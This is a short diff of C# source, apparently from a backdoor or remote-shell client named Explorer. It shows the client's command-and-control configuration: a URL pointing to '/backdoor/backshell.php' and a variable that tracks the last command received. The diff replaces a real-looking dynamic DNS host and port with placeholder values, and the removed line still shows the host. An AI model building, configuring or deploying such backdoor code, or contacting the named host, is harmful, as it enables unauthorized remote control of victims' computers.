@@ -118,8 +118,8 @@ namespace Explorer
             #region Variables
             private const int _Version = 126;
             static int vzs = 0;
-            static readonly string host = "hagash.ddns.net";
-            static readonly string port = "160";
+            static readonly string host = "ip";
+            static readonly string port = "port";
             static readonly string URL = $"http://{host}:{port}/backdoor/backshell.php";
             static readonly string URLd = $"http://{host}:{port}/backdoor/";
             static string last_cmd = "";
